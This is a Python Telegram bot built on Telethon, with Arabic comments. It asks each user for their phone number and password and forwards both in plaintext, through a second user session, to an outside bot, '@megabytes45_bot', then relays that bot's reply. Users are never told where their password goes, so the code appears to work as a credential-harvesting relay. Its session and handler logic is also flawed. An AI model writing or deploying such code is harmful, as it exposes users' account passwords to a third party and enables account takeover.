import os
from telethon import TelegramClient, events
import asyncio

# جلب البيانات من المتغيرات البيئية
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

# إنشاء عميل للـ bot
client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=bot_token)

# قاموس لتخزين حالة كل مستخدم
users_state = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    sender_id = event.sender_id
    users_state[sender_id] = {'step': 'waiting_number'}
    await event.respond('مرحبًا! الرجاء إرسال رقمك.')

@client.on(events.NewMessage)
async def handle_message(event):
    sender_id = event.sender_id
    message = event.message.message

    if sender_id not in users_state:
        users_state[sender_id] = {'step': 'waiting_number'}
        await event.respond('مرحبًا! الرجاء إرسال رقمك.')
        return

    user_state = users_state[sender_id]

    if user_state['step'] == 'waiting_number':
        # استلام الرقم
        user_state['number'] = message
        user_state['step'] = 'waiting_password'
        await event.respond('الرجاء إرسال كلمة المرور.')
    elif user_state['step'] == 'waiting_password':
        # استلام كلمة المرور
        user_state['password'] = message
        # الآن نرسل البيانات للبوت الآخر
        await send_to_other_bot(sender_id, user_state['number'], user_state['password'])
        user_state['step'] = 'waiting_reply'
        await event.respond('تم الإرسال، يرجى الانتظار للرد.')

async def send_to_other_bot(sender_id, number, password):
    # استخدام Telethon لإرسال رسالة للبوت الآخر والانتظار للرد
    async with TelegramClient('client_session', api_id, api_hash) as other_client:
        await other_client.start()
        message_text = f"رقم: {number}\nكلمة المرور: {password}"
        await other_client.send_message('@megabytes45_bot', message_text)

        # استماع للرد من البوت الآخر
        @other_client.on(events.NewMessage(from_users='@megabytes45_bot'))
        async def reply_handler(event):
            reply_message = event.message.message
            # إرسال الرد للمستخدم الأصلي
            await client.send_message(sender_id, f"رد البوت الآخر: {reply_message}")

        # انتظار حتى يتم استلام الرد
        await asyncio.sleep(10)

client.run_until_disconnected()
